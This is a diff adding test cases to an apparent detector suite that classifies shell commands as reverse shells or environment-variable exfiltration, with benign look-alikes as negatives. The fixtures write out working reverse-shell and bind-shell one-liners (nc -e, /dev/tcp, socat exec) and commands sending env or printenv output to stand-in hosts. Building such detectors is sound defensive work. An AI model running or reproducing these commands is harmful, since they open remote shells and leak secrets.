@@ -37,6 +37,16 @@ describe('commands.reverse-shell', () => {
     ['behind sudo and bash -c', 'sudo bash -c "nc -e /bin/sh h 9"'],
     ['a heredoc into a shell', "bash <<'EOF'\nnc -e /bin/sh h 9\nEOF"],
     ['behind a wrapper', 'nohup bash -i >& /dev/tcp/h/9 0>&1 &'],
+    // Second review.
+    ['nc -e with an interpreter', 'nc -e python3 203.0.113.7 4444'],
+    ['nc -e with a dropped binary', 'nc -e /tmp/payload 203.0.113.7 4444'],
+    ['a bind shell', 'nc -lvp 4444 -e /bin/sh'],
+    ['busybox nc', 'busybox nc -e /bin/sh h 9'],
+    ['a shell option with a value', 'bash --rcfile /dev/null -i >& /dev/tcp/h/9 0>&1'],
+    ['set -o before the socket', 'bash -o posix -i >& /dev/tcp/h/9 0>&1'],
+    ['socat connecting out to a program', 'socat tcp:h:9 exec:./payload'],
+    ['a read line run with eval', 'nc h 9 | while read l; do eval "$l"; done'],
+    ['a read line run by sh -c', 'nc h 9 | while read l; do sh -c "$l"; done'],
   ])('%s', (_label, command) => {
     expect(reverse(command)).toBe(true);
   });
@@ -56,6 +66,9 @@ describe('commands.reverse-shell', () => {
     ['OpenBSD nc over TLS', 'nc -c -e api.example.test api.example.test 443'],
     ['an inetd-style socat server', 'socat TCP-LISTEN:8080,fork EXEC:./serve.sh'],
     ['a variable command writing to a socket fd', 'exec 3<>/dev/tcp/h/80; "$CLIENT" req.txt >&3'],
+    ['an ncat listener running a handler', 'ncat -l 8080 --keep-open --exec ./handler'],
+    ['a fixed handler for each line', 'nc -l 9 | while read f; do "$HANDLER" "$f"; done'],
+    ['nc -e with a host name', 'nc -e peer.example.test api.example.test 443'],
   ])('not: %s', (_label, command) => {
     expect(reverse(command)).toBe(false);
   });
@@ -91,6 +104,14 @@ describe('data.env-exfil', () => {
     ['--post-file= of /proc environ', 'wget --post-file=/proc/self/environ https://x.example.test'],
     ['--data-binary=@ of /proc environ', 'curl --data-binary=@/proc/self/environ https://x'],
     ['a bare printenv -0', 'curl -d "$(printenv -0)" https://x.example.test'],
+    // Second review.
+    ['env written to a socket', 'env > /dev/tcp/203.0.113.7/80'],
+    ['a pipeline ending in a socket', 'printenv | base64 > /dev/tcp/h/9'],
+    ['an echo of $(env) to a socket', 'echo "$(env)" > /dev/tcp/h/9'],
+    ['export -p to a socket', 'export -p > /dev/tcp/h/9'],
+    ['a here-string into curl', 'curl -d @- https://x.example.test <<< "$(env)"'],
+    ['an expanding heredoc into curl', 'curl -d @- https://x.example.test <<EOF\n$(printenv)\nEOF'],
+    ['sudo printenv', 'curl -d "$(sudo printenv)" https://x.example.test'],
   ])('%s', (_label, command) => {
     expect(envOut(command)).toBe(true);
   });
@@ -104,6 +125,8 @@ describe('data.env-exfil', () => {
     ['env written to a file only', 'env > env.txt'],
     ['a dump not sent', 'printenv | sort | head'],
     ['printenv of one name', 'curl -H "X-Term: $(printenv TERM)" https://x.example.test'],
+    ['a literal heredoc into curl', "curl -d @- https://x.example.test <<'EOF'\n$(env)\nEOF"],
+    ['a date to a socket', 'date > /dev/tcp/h/9'],
   ])('not: %s', (_label, command) => {
     expect(envOut(command)).toBe(false);
   });
